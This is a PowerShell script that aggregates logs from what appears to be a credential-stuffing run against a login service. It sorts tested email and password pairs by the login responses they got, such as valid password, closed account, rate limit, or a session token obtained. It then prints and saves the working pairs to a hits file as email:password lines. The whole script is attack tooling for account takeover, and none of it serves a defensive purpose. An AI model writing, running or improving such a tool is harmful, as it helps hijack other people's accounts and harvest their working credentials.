param(
  [Parameter(Mandatory=$true)][string]$RunDir,
  [string]$OutCsv = "",
  [string]$HitsFile = ""
)

# Aggregate every JSONL under a run root into final numbers.
# Verdict precedence: success > validated > closed > needs-email > unable > 403 > 429 > NO_POST.
# Only success/validated/closed are verdicts. Hits (success + zss) are written separately.

$priority = @{ success = 9; validated = 8; closed = 7; link = 6; unable = 5; other = 4; '429' = 3; '403' = 2; 'NO_POST' = 0 }
$map = @{}
$hits = New-Object System.Collections.Generic.List[object]
$files = Get-ChildItem $RunDir -Recurse -Filter *.jsonl -ErrorAction SilentlyContinue

foreach ($f in $files) {
  Get-Content $f.FullName -ErrorAction SilentlyContinue | ForEach-Object {
    try { $o = $_ | ConvertFrom-Json } catch { return }
    if (-not $o.email -or $o.i -eq $null) { return }
    $b = [string]$o.body
    $hasSession = ($o.success -eq $true) -and (($o.zss -ne $null -and $o.zss -gt 0) -or $o.profileStatus -eq 200)
    $cat =
      if ($hasSession) { 'success' }
      elseif ($o.success -eq $true) { 'nosession' }
      elseif ($o.validated -eq $true -or $b -like '*or password you ent*') { 'validated' }
      elseif ($b -like '*has been closed*') { 'closed' }
      elseif ($b -like '*login link*' -or $b -like '*require_link*' -or $o.link -eq $true) { 'link' }
      elseif ($o.unable -eq $true -or $b -like '*unable to log you in*') { 'unable' }
      elseif ($o.status -eq 403) { '403' }
      elseif ($o.status -eq 429 -or $b -like '*Too Many Requests*') { '429' }
      elseif ($o.status -eq $null) { 'NO_POST' }
      else { 'other' }

    $cur = $map[$o.email]
    if (-not $cur -or $priority[$cat] -gt $priority[$cur.cat]) {
      $map[$o.email] = @{ cat = $cat; email = $o.email }
    }
    if ($hasSession) {
      $hits.Add([pscustomobject]@{ email = $o.email; password = $o.pass; profile = $o.profileStatus; zssLen = $o.zss })
    }
  }
}

$groups = $map.Values | Group-Object { $_.cat } | Sort-Object Count -Descending
$total = $map.Count
Write-Output ("unique credentials tested: {0}" -f $total)
foreach ($g in $groups) { Write-Output ("  {0,-10} {1}" -f $g.Name, $g.Count) }

$verdicts = ($groups | Where-Object { $_.Name -in @('success', 'validated', 'closed') } | Measure-Object Count -Sum).Sum
if ($null -eq $verdicts) { $verdicts = 0 }
$unresolved = $total - $verdicts
Write-Output ("verdicts={0} unresolved={1} ({2}%)" -f $verdicts, $unresolved, [math]::Round(100.0 * $unresolved / [Math]::Max(1, $total), 1))

if ($OutCsv) {
  $map.Values | Sort-Object { $_.cat }, { $_.email } | ForEach-Object { [pscustomobject]@{ email = $_.email; result = $_.cat } } |
    Export-Csv -Path $OutCsv -NoTypeInformation -Encoding UTF8
  Write-Output ("csv: {0}" -f $OutCsv)
}

$uniqHits = $hits | Sort-Object email -Unique
Write-Output ("hits (success + zss): {0}" -f @($uniqHits).Count)
foreach ($h in $uniqHits) { Write-Output ("  {0}:{1}  profile={2} zss={3}" -f $h.email, $h.password, $h.profile, $h.zssLen) }
if ($HitsFile) {
  $uniqHits | ForEach-Object { "{0}:{1}" -f $_.email, $_.password } | Set-Content -Encoding ascii $HitsFile
  Write-Output ("hits file: {0}" -f $HitsFile)
}
